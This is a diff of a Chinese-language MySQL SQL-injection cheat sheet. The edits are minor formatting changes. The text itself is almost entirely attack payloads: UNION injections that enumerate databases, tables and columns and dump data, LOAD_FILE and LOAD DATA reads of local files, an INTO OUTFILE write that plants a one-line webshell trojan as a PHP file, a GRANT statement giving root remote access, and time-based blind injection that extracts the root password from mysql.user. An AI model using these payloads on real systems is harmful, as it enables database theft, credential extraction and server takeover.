@@ -31,10 +31,8 @@ load_file() MYSQL读取本地文件的函数
 
 GRANT ALL PRIVILEGES ON *.* TO ‘root’@’%’ IDENTIFIED BY ‘123456’ WITH GRANT OPTION;
 
-5.mysql一般注入语句
-
+5. mysql一般注入语句
 猜字段数
-
 order by n/*  
 查看mysql基本信息  
 and 1=2 union select 1,2,3,concat_ws(char(32,58,32),0x7c,user(),database(),version()),5,6,7/*  
@@ -49,47 +47,35 @@ and 1=2 union select 1,2,3,4,column_name,5,6,7 from information_schema.columns w
 and 1=2 union select 1,2,3,4,group_concat(column_name),5,6,7 from information_schema.columns where table_name=表名的十六进制编码 and table_schema=数据库的16进制编码/*  
 查询数据  
 and 1=2 union select 1,2,3,字段1,5,字段2,7,8 from 数据库.表/*
-
 判断是否具有读写权限  
 and (select count(*) from mysql.user)>0/*  
 and (select count(file_priv) from mysql.user)>0/*
 
-6.mysql读取写入文件
-
+6. mysql读取写入文件
 必备条件：
-
 读：file权限必备
-
 写：1.绝对路径 2.union使用 3. 可以使用”
-
 ————————-读———————-
-
 mysql3.x读取方法  
 create table a(cmd text);  
 load data infile ‘c:\\xxx\\xxx\\xxx.txt’ into table a;  
 select * from a;
-
 mysql4.x读取方法  
 除上述方法还可以使用load_file()  
 create table a(cmd text);  
 insert into a(cmd) values(load_file(‘c:\\ddd\\ddd\\ddd.txt’));  
 select * from a;
-
 mysql5.x读取方法  
 上述两种都可以
-
 读取文件技巧：  
 load_file(char(32,26,56,66))  
 load_file(0x633A5C626F6F742E696E69)
-
 ————写————————–
-
 into outfile写文件
-
 union select 1,2,3,char(这里写入你转换成10进制或16进制的一句话木马代码),5,6,7,8,9,10,7 into outfile ‘d:\web\90team.php’/*  
 union select 1,2,3,load_file(‘d:\web\logo123.jpg’),5,6,7,8,9,10,7 into outfile ‘d:\web\90team.php’/*
 
-0x01 mysql一般注入(insert、update)
+**0x01 mysql一般注入(insert、update)**
 
 mysql一般请求mysql_query不支持多语句执行，mysqli可以。
 
@@ -131,5 +117,5 @@ and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA=”blind_sqli�
 
 UNION SELECT IF(SUBSTRING(Password,1,1)=’a’,BENCHMARK(100000,SHA1(1)),0) User,Password FROM mysql.user WHERE User = ‘root’
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbMTcwMjgxNzgzNl19
+eyJoaXN0b3J5IjpbLTMyNjU2MDAwNl19
 -->
